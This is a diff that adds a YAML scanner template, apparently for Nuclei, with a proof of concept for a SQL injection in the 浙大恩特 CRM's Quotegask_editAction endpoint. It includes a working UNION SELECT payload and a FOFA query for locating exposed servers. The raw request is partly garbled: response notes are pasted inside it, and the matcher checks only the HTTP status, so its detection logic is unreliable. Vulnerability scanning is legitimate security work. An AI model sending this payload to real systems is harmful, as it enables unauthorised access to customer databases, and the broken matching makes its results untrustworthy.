@@ -1,0 +1,34 @@
+id: poc-zgdgiaxywfwkg6e3
+info:
+  name: 浙大恩特客户资源管理系统 Quotegask_editAction-sql SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zgdgiaxywfwkg6e3'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zgdgiaxywfwkg6e3
+    fofa: title="欢迎使用浙大恩特客户资源管理系统" || body="ｓｃｒｉｐｔ/Ent.base.js" || app="浙大恩特客户资源管理系统"
+http:
+- raw:
+  - 'GET /entsoft/Quotegask_editAction.entweb;.js?goonumStr=1'')+UNION+ALL+SELECT+520*1314--+&method=goonumIsExist HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    56088
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
